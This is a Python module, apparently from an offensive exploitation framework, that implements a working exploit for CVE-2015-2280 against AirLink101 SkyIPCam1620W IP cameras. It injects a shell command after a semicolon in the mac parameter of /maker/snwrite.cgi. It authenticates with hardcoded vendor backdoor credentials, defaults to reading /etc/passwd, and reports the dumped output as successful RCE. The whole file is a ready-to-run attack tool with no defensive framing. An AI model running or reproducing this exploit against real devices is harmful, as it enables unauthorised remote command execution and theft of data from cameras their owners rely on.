import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "airlink101_skyipcam_rce/device_rsp_attack"
        self.description = "AirLink101 SkyIPCam1620W OS Command Injection Exploit (CVE-2015-2280)."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"},
            "CMD": {"required": False, "value": "cat /etc/passwd"} # Option dynamique lue par ton QTableWidget / CLI
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        cmd = self.options["CMD"]["value"]
        
        print(f"\033[1;31m[!] Launching attack payload loop against AirLink101 device...\033[0m")
        
        # Structuration de l'injection : injection du point-virgule pour casser le script d'origine
        payload_path = f"/maker/snwrite.cgi?mac=1234;{cmd}"
        
        url = f"http://{target}:{port}{payload_path}" if not target.startswith(("http://", "https://")) else f"{target.rstrip('/')}{payload_path}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0"
        }
        
        backdoor_auth = ("productmaker", "ftvsbannedcode")
        
        try:
            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                print(f"\033[1;33m[*] Sending payload. Executing system command: '{cmd}'...\033[0m")
                response = await client.get(url, headers=headers, auth=backdoor_auth)
                
                if response.status_code == 200 and len(response.text) > 0:
                    return {
                        "success": True,
                        "details": f"RCE Executed Successfully!\n\n[DUMPED DATA]:\n{response.text.strip()}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit triggered but target machine output was empty or unhandled."}
